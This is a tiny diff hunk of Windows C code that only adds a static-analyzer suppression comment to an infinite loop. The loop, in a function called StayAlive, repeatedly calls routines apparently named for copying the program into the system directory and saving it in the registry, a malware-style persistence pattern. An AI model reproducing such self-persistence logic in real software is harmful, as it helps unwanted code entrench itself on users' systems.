@@ -118,7 +118,7 @@ BOOL SaveInReg(CONST PTCHAR appname) //-V2009
 
 VOID StayAlive(CONST PTCHAR appname)
 {
-	for(;;)
+	for(;;) //-V776
 	{
 		Copy2Sysdir(appname);
 		SaveInReg(appname);
